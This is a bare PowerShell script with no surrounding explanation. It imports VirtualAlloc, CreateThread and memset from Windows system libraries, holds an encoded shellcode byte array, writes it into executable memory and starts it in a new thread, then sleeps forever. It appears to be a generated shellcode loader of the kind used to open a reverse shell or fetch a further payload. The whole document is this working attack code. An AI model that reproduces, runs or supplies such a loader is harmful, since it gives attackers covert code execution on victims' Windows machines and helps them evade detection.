
$NOf6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NOf6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc2,0x01,0xec,0x84,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x42,0x0f,0x03,0x42,0xcd,0xe3,0x19,0x78,0x39,0x61,0xe1,0x81,0xb9,0x06,0x6b,0x64,0x88,0x06,0x0f,0xec,0xba,0xb6,0x5b,0xa0,0x36,0x3c,0x09,0x51,0xcd,0x30,0x86,0x56,0x66,0xfe,0xf0,0x59,0x77,0x53,0xc0,0xf8,0xfb,0xae,0x15,0xdb,0xc2,0x60,0x68,0x1a,0x03,0x9c,0x81,0x4e,0xdc,0xea,0x34,0x7f,0x69,0xa6,0x84,0xf4,0x21,0x26,0x8d,0xe9,0xf1,0x49,0xbc,0xbf,0x8a,0x13,0x1e,0x41,0x5f,0x28,0x17,0x59,0xbc,0x15,0xe1,0xd2,0x76,0xe1,0xf0,0x32,0x47,0x0a,0x5e,0x7b,0x68,0xf9,0x9e,0xbb,0x4e,0xe2,0xd4,0xb5,0xad,0x9f,0xee,0x01,0xcc,0x7b,0x7a,0x92,0x76,0x0f,0xdc,0x7e,0x87,0xdc,0xbb,0xf5,0x8b,0xa9,0xc8,0x52,0x8f,0x2c,0x1c,0xe9,0xab,0xa5,0xa3,0x3e,0x3a,0xfd,0x87,0x9a,0x67,0xa5,0xa6,0xbb,0xcd,0x08,0xd6,0xdc,0xae,0xf5,0x72,0x96,0x42,0xe1,0x0e,0xf5,0x0a,0xc6,0x22,0x06,0xca,0x40,0x34,0x75,0xf8,0xcf,0xee,0x11,0xb0,0x98,0x28,0xe5,0xb7,0xb2,0x8d,0x79,0x46,0x3d,0xee,0x50,0x8c,0x69,0xbe,0xca,0x25,0x12,0x55,0x0b,0xca,0xc7,0xc0,0x0e,0x5c,0x55,0xbe,0xf1,0x1d,0xcd,0xbd,0xf1,0x1b,0xaa,0x4b,0x17,0x73,0xe2,0x1b,0x88,0x33,0x52,0xdc,0x78,0xdb,0xb8,0xd3,0xa7,0xfb,0xc2,0x39,0xc0,0x91,0x2c,0x94,0xb8,0x0d,0xd4,0xbd,0x33,0xac,0x19,0x68,0x3e,0xee,0x92,0x9f,0xbe,0xa0,0x52,0xd5,0xac,0x54,0x93,0xa0,0x8f,0xf2,0xac,0x1e,0xa5,0xfa,0x38,0xa5,0x6c,0xad,0xd4,0xa7,0x49,0x99,0x7a,0x57,0xbc,0x92,0xb3,0xcd,0x7f,0xcc,0xbb,0x01,0x80,0x0c,0xea,0x4b,0x80,0x64,0x4a,0x28,0xd3,0x91,0x95,0xe5,0x47,0x0a,0x00,0x06,0x3e,0xff,0x83,0x6e,0xbc,0x26,0xe3,0x30,0x3f,0x0d,0xf5,0x0d,0x96,0x6b,0x83,0x7f,0x2a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lGL=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lGL.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lGL,0,0,0);for (;;){Start-sleep 60};

